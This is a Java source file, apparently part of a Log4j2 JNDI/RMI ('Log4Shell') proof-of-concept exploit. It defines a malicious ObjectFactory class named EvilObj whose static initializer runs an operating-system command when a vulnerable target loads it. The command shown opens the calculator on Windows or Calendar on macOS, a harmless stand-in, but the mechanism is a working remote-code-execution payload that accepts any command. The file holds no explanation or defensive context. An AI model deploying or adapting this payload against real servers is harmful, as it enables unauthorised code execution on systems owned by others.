package com.halibobo.log4j2.rmi;

import java.io.IOException;
import java.util.Hashtable;
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;

public class EvilObj implements ObjectFactory {

  static {
    System.out.println("where i am?");
    String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
        ? new String[]{"cmd.exe","/c", "calc.exe"}
        : new String[]{"open","/Applications/Calendar.app"};
    try {
      Runtime.getRuntime().exec(cmds).waitFor();
    } catch (InterruptedException | IOException e) {
      e.printStackTrace();
    }
  }

  @Override
  public Object getObjectInstance(Object obj, Name name, Context nameCtx,
                                  Hashtable<?, ?> environment) throws Exception {
    return null;
  }
}
